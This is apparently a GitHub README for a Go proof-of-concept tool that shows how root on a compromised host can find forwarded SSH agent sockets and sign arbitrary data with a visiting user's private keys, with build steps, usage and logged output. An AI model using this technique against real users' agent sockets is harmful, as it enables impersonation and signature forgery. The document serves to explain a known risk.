Private key operations using ssh agent

Here are some of the perils of ssh agent forwarding :

https://heipei.io/2015/02/26/SSH-Agent-Forwarding-considered-harmful/

A cool, simple explanation of agent forwarding is here

http://www.unixwiz.net/techtips/ssh-agent-forwarding.html

The protocol for the agent is defined here

https://tools.ietf.org/id/draft-miller-ssh-agent-04.html


To build 

```
go get github.com/dandare100/agentstub
go build github.com/dandare100/agentstub
```

This project illustrates private key operations. Not the fact that anybody who has root on the target box can login to any other machine you have access to using your key/s whilst you are logged in. That is covered in the links above.

It uses the agent socket that is setup when using ssh agent forwarding and as such is aimed at showing what can happen when you ssh into a machine (using ssh agent forwarding) and that machine has been compromised, or someone malicious has root on that machine

Now, if you are signed into a machine with ssh agent forwarding on, anyone with root on that machine (or access to your agent socket) can perform a private key operation, on the remote machine, without ever seeing or accessing your private key.

This tool will illustrate how:

Login as root, get root or modify the perms of the agent socket on the machine. This assumption is stated above :-)

```
[root@server2 ~]$ /tmp/agentstub --help
Usage of /tmp/agentstub:
  -action string
    	[listallids, listidsforagent, listagentpaths, pvtkeyop, queryext] (default "listallids")
  -agentpath string
    	The agent path for the action to use when processing (default "none")
  -dir string
    	The parent directory to start searching in. (default "/tmp")
  -extquery string
    	The extension query string (default "all")
  -keyblobb64 string
    	The base 64 representation of the public key blob (default "none")
  -keyopdatab64 string
    	The data to perform the private key operation on (default "none")
```

List the available agent paths. This will search the default location for agent forwarding sockets, loop through them and interrogate each agent socket for all the id's it is willing to support.

```
[root@server2 ~]$ /tmp/agentstub 
2020/05/17 16:32:00 Processing action listallids
2020/05/17 16:32:00 1 sockets found.
2020/05/17 16:32:00 Retrieving identities from /tmp/ssh-FSpkWV2CH4/agent.5636
2020/05/17 16:32:01 Wrote 5 bytes
2020/05/17 16:32:01 Read 1143 bytes
2020/05/17 16:32:01 There were 2 identities returned.
2020/05/17 16:32:01 ID (b64): AAAAB3NzaC1yc2EAAAADAQABAAACAQCf5xBJv5tI/wwE4kQ1Hv17gO2dE1AoO1SNptFDHpPNAGUCXTSAYPiPjczBf/ZPLHtu4/Pr+xSIoDgTofJNt5yPMgk6skFVi0lRmwmF5zKvFVYdAn5Hi4NPG8T9mJVxChdUQO+37eQlx52urulfHnfkonur2OxgKoWQg6Gfe/NcYMo7pvjzLInwXgrLzSZ3w9Y6hwFJzlIv+Kn5sDVspEQ4+GCE15KIcHGtt6Xz/vQETW7HtO+/PIMnPg2bKuAgCERcPU9pRsx2B8a/ZCLOwhKeAKmd/+0Xf/Fz+NvRlsgcob96pE7y04k9XBo+7ITVoDw2EN03OROQL5Zs3sFs0nilFpVn5C2g1GGYqcySSNoFZcDqHJ4bGJcHZ83Bg1xOcKMQxtzjvJqHDa+pbKvbqOIkNvj4Os2SLkNkKOyMI/LeBKbTansI9Erla8UNkEo7wUx/QeM3dlViSgwGvSGEfkZIsNw9yRd0Pp0HKcFQQ5euQUEmG4OjS+UjypLH9XV7uvjpTyazSBKJ4Ukw4Zncs6eLMBGIEJWD+Ra5IF3AjjSAnqEM1pJj9OBpvwlR20o9BoQqdPJ4lj0iZ7WGdVhI3VskwQvRBLatjhY3zQiklMB7+BYpGOoseo8JG+ItDk2jsaVouJLOUiIexFFhJN+o4avhmL4X6lq0TKpLdskl08xlfQ==
2020/05/17 16:32:01 Comment : /home/jeff/.ssh/id_rsa
2020/05/17 16:32:01 ID (b64): AAAAB3NzaC1yc2EAAAADAQABAAACAQCf5xBJv5tI/wwE4kQ1Hv17gO2dE1AoO1SNptFDHpPNAGUCXTSAYPiPjczBf/ZPLHtu4/Pr+xSIoDgTofJNt5yPMgk6skFVi0lRmwmF5zKvFVYdAn5Hi4NPG8T9mJVxChdUQO+37eQlx52urulfHnfkonur2OxgKoWQg6Gfe/NcYMo7pvjzLInwXgrLzSZ3w9Y6hwFJzlIv+Kn5sDVspEQ4+GCE15KIcHGtt6Xz/vQETW7HtO+/PIMnPg2bKuAgCERcPU9pRsx2B8a/ZCLOwhKeAKmd/+0Xf/Fz+NvRlsgcob96pE7y04k9XBo+7ITVoDw2EN03OROQL5Zs3sFs0nilFpVn5C2g1GGYqcySSNoFZcDqHJ4bGJcHZ83Bg1xOcKMQxtzjvJqHDa+pbKvbqOIkNvj4Os2SLkNkKOyMI/LeBKbTansI9Erla8UNkEo7wUx/QeM3dlViSgwGvSGEfkZIsNw9yRd0Pp0HKcFQQ5euQUEmG4OjS+UjypLH9XV7uvjpTyazSBKJ4Ukw4Zncs6eLMBGIEJWD+Ra5IF3AjjSAnqEM1pJj9OBpvwlR20o9BoQqdPJ4lj0iZ7WGdVhI3VskwQvRBLatjhY3zQiklMB7+BYpGOoseo8JG+ItDk2jsaVouJLOUiIexFFhJN+o4avhmL4X6lq0TKpLdskl08xlfQ==
2020/05/17 16:32:01 Comment : jeff@server2
```
Generate the sha-512 of a document. This could be any document. The principle is that we are signing a document with someone elses private key.

```
jeff@server1:~/.ssh$ sha512sum /usr/share/cups/data/classified.pdf
e5efad8e4757b743b60eda78d7caa023d1e72e12d1ae566097bc686918e3cbd4a4bfd854d1d70a9e8e21ffe31031baf380adcf012fd5fb3364a5a3e37242b9d2  /usr/share/cups/data/classified.pdf
```

Take the sha-512 sum of the document and base64 encode it. 

```
root@server2:~/.ssh$ echo -n e5efad8e4757b743b60eda78d7caa023d1e72e12d1ae566097bc686918e3cbd4a4bfd854d1d70a9e8e21ffe31031baf380adcf012fd5fb3364a5a3e37242b9d2 | base64
ZTVlZmFkOGU0NzU3Yjc0M2I2MGVkYTc4ZDdjYWEwMjNkMWU3MmUxMmQxYWU1NjYwOTdiYzY4Njkx
OGUzY2JkNGE0YmZkODU0ZDFkNzBhOWU4ZTIxZmZlMzEwMzFiYWYzODBhZGNmMDEyZmQ1ZmIzMzY0
YTVhM2UzNzI0MmI5ZDI=
```

Now request the tool to sign this hash using one of the id's above

```
[root@server2 ~]$ /tmp/agentstub -action=pvtkeyop -keyblobb64='AAAAB3NzaC1yc2EAAAADAQABAAACAQCf5xBJv5tI/wwE4kQ1Hv17gO2dE1AoO1SNptFDHpPNAGUCXTSAYPiPjczBf/ZPLHtu4/Pr+xSIoDgTofJNt5yPMgk6skFVi0lRmwmF5zKvFVYdAn5Hi4NPG8T9mJVxChdUQO+37eQlx52urulfHnfkonur2OxgKoWQg6Gfe/NcYMo7pvjzLInwXgrLzSZ3w9Y6hwFJzlIv+Kn5sDVspEQ4+GCE15KIcHGtt6Xz/vQETW7HtO+/PIMnPg2bKuAgCERcPU9pRsx2B8a/ZCLOwhKeAKmd/+0Xf/Fz+NvRlsgcob96pE7y04k9XBo+7ITVoDw2EN03OROQL5Zs3sFs0nilFpVn5C2g1GGYqcySSNoFZcDqHJ4bGJcHZ83Bg1xOcKMQxtzjvJqHDa+pbKvbqOIkNvj4Os2SLkNkKOyMI/LeBKbTansI9Erla8UNkEo7wUx/QeM3dlViSgwGvSGEfkZIsNw9yRd0Pp0HKcFQQ5euQUEmG4OjS+UjypLH9XV7uvjpTyazSBKJ4Ukw4Zncs6eLMBGIEJWD+Ra5IF3AjjSAnqEM1pJj9OBpvwlR20o9BoQqdPJ4lj0iZ7WGdVhI3VskwQvRBLatjhY3zQiklMB7+BYpGOoseo8JG+ItDk2jsaVouJLOUiIexFFhJN+o4avhmL4X6lq0TKpLdskl08xlfQ==' -keyopdatab64='ZTVlZmFkOGU0NzU3Yjc0M2I2MGVkYTc4ZDdjYWEwMjNkMWU3MmUxMmQxYWU1NjYwOTdiYzY4NjkxOGUzY2JkNGE0YmZkODU0ZDFkNzBhOWU4ZTIxZmZlMzEwMzFiYWYzODBhZGNmMDEyZmQ1ZmIzMzY0YTVhM2UzNzI0MmI5ZDI=' -agentpath=/tmp/ssh-FSpkWV2CH4/agent.5636
2020/05/17 16:32:38 Processing action pvtkeyop
2020/05/17 16:32:38 Wrote 680 bytes
2020/05/17 16:32:38 Read 536 bytes
2020/05/17 16:32:38 Encode type : ssh-rsa
2020/05/17 16:32:38 rsa signature blob length : 512
2020/05/17 16:32:38 rsa signature blob : 8877944cee1b6396759d3e1e568eee28891be05f221ce39f7fdcbdd6e8c6c6794b0433d3643665e39542ce9b5b61c4f6fc70f587b878ce5a6c4f701493ea17ef19509b6ea2ef247ae02df3089b79723f68b3ade2cedb5aee5cb44fb9521a5e668b77d35f0c837179613effc3d55c78ab0744a56ee7917a948edfc36e6ca968b61d094cbf8fc9a1aee2153f9f6c8bac88c9f671023b15df1df9a0bd5ea47294e58ea05a7ce28abcdd97739d35801081e74d6715176d0695413e828737fd76a73301e2b68ce8ac08f95e4346cee53e71280eb808a1b3c2c1e3718775b2f28481a78f05ec206b6d5c879f0abdd8a1f207b293171b0803d86bc7acdf2b59661e3117191cd702563e3062309c4dcc460b5a2650edaf808d495d6185f8da42a606aa48c8c7b84f8a4a000e3af56c9950dda8af70dd3ea20e45bbf5cb4509a64054af0b01647f26859190c2c46ce4200cf670a71f54291ff878005572687355fa8e35d59a382f7b4b01af102409be9d7b54a2d369f50149a8bf49c6217f4c3559522eae086efbbe62dc1effb3fe7c0a75852206bac0d0b4f145d1438a8b65a75d49d69ebc7c09dea14435e1cf7e5c77a624d4767ea67e9c26d9a9de1ef248ebda5bb84bc4beb8cf986b82b9b796f0c5a2f8faf9d5e76f40b8ccde293e38b08ef13067efdab310ab76483a93f1a835f6d8c4c868b7de0cfd7b63ea839264ac03ea1e3eee
```

Now lets generate the same rsa signature blob for the document using the private key to see if they are the same :

Take the document and generate it's sha-512 sum

```
jeff@server1:~/.ssh$ sha512sum /usr/share/cups/data/classified.pdf
e5efad8e4757b743b60eda78d7caa023d1e72e12d1ae566097bc686918e3cbd4a4bfd854d1d70a9e8e21ffe31031baf380adcf012fd5fb3364a5a3e37242b9d2  /usr/share/cups/data/classified.pdf
```

Now sign it with your private key and display the hex values

```
jeff@server1:~/.ssh$ echo -n e5efad8e4757b743b60eda78d7caa023d1e72e12d1ae566097bc686918e3cbd4a4bfd854d1d70a9e8e21ffe31031baf380adcf012fd5fb3364a5a3e37242b9d2 | openssl dgst -sha1 -sign ~/.ssh/id_rsa | xxd

00000000: 8877 944c ee1b 6396 759d 3e1e 568e ee28  .w.L..c.u.>.V..(
00000010: 891b e05f 221c e39f 7fdc bdd6 e8c6 c679  ..._"..........y
00000020: 4b04 33d3 6436 65e3 9542 ce9b 5b61 c4f6  K.3.d6e..B..[a..
00000030: fc70 f587 b878 ce5a 6c4f 7014 93ea 17ef  .p...x.ZlOp.....
00000040: 1950 9b6e a2ef 247a e02d f308 9b79 723f  .P.n..$z.-...yr?
00000050: 68b3 ade2 cedb 5aee 5cb4 4fb9 521a 5e66  h.....Z.\.O.R.^f
00000060: 8b77 d35f 0c83 7179 613e ffc3 d55c 78ab  .w._..qya>...\x.
00000070: 0744 a56e e791 7a94 8edf c36e 6ca9 68b6  .D.n..z....nl.h.
00000080: 1d09 4cbf 8fc9 a1ae e215 3f9f 6c8b ac88  ..L.......?.l...
00000090: c9f6 7102 3b15 df1d f9a0 bd5e a472 94e5  ..q.;......^.r..
000000a0: 8ea0 5a7c e28a bcdd 9773 9d35 8010 81e7  ..Z|.....s.5....
000000b0: 4d67 1517 6d06 9541 3e82 8737 fd76 a733  Mg..m..A>..7.v.3
000000c0: 01e2 b68c e8ac 08f9 5e43 46ce e53e 7128  ........^CF..>q(
000000d0: 0eb8 08a1 b3c2 c1e3 7187 75b2 f284 81a7  ........q.u.....
000000e0: 8f05 ec20 6b6d 5c87 9f0a bdd8 a1f2 07b2  ... km\.........
000000f0: 9317 1b08 03d8 6bc7 acdf 2b59 661e 3117  ......k...+Yf.1.
00000100: 191c d702 563e 3062 309c 4dcc 460b 5a26  ....V>0b0.M.F.Z&
00000110: 50ed af80 8d49 5d61 85f8 da42 a606 aa48  P....I]a...B...H
00000120: c8c7 b84f 8a4a 000e 3af5 6c99 50dd a8af  ...O.J..:.l.P...
00000130: 70dd 3ea2 0e45 bbf5 cb45 09a6 4054 af0b  p.>..E...E..@T..
00000140: 0164 7f26 8591 90c2 c46c e420 0cf6 70a7  .d.&.....l. ..p.
00000150: 1f54 291f f878 0055 7268 7355 fa8e 35d5  .T)..x.UrhsU..5.
00000160: 9a38 2f7b 4b01 af10 2409 be9d 7b54 a2d3  .8/{K...$...{T..
00000170: 69f5 0149 a8bf 49c6 217f 4c35 5952 2eae  i..I..I.!.L5YR..
00000180: 086e fbbe 62dc 1eff b3fe 7c0a 7585 2206  .n..b.....|.u.".
00000190: bac0 d0b4 f145 d143 8a8b 65a7 5d49 d69e  .....E.C..e.]I..
000001a0: bc7c 09de a144 35e1 cf7e 5c77 a624 d476  .|...D5..~\w.$.v
000001b0: 7ea6 7e9c 26d9 a9de 1ef2 48eb da5b b84b  ~.~.&.....H..[.K
000001c0: c4be b8cf 986b 82b9 b796 f0c5 a2f8 faf9  .....k..........
000001d0: d5e7 6f40 b8cc de29 3e38 b08e f130 67ef  ..o@...)>8...0g.
000001e0: dab3 10ab 7648 3a93 f1a8 35f6 d8c4 c868  ....vH:...5....h
000001f0: b7de 0cfd 7b63 ea83 9264 ac03 ea1e 3eee  ....{c...d....>.
```


The rsa signature generated with the private key matches the one generated via the agent socket on the remote machine.

The agent in use above was the default agent for Ubuntu 16.04. 

The milage may vary and it will depend on the agent implementation.









